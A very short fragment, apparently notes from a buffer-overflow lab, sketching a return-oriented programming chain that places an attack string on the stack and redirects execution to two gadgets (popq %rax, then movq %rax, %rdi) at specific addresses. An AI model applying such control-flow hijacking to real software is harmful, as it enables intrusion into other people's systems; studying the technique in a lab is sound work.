# read attack string to %rsp, which is stack top
# hijack program to gadget 1: 0x4021bc
popq %rax

# hijack program to gadget 2: 0x402199
movq %rax, %rdi
